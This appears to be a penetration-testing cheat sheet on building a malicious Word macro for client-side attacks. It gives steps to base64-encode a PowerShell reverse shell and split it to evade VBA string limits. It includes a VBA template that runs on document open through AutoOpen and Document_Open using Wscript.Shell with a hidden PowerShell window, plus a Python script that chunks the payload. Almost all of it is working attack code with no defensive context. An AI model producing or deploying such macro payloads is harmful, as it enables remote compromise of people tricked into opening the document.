# Client side

## Word macro

#### Create macro

1. view → macro → create macro → Macros in: Doc \[document]
2. `<ps reverse shell> | base64 | tr -d “\n”`
3. Split the generated string in several 50-length strings and concatenate them in the script to avoid VBA string size limit of 255 chars
4. Store the file as **.doc** or **.docm** NOT as **.docx**

#### VBA template

```
Sub AutoOpen()
<macro name>
End Sub
Sub Document_Open()
<macro name>
End Sub
Sub <macro name>()
Dim <var> As String
<splitted base64 string>
CreateObject("Wscript.Shell").Run <var>
End Sub
```

#### Python cut script

```
b64 = ""				# paste base64 string here
varname = "Str"	# set variable name
n = 50					#line length

opt = "powershell.exe -nop -w hidden -e"
str = opt+" "+b64
for i in range(0, len(str), n):
	if i==0:
		print(varname + ' = "' + str[i:i+n] + '"')
	else:
		print(varname + ' = "' + varname + ' + "' + str[i:i+n] + '"')
```

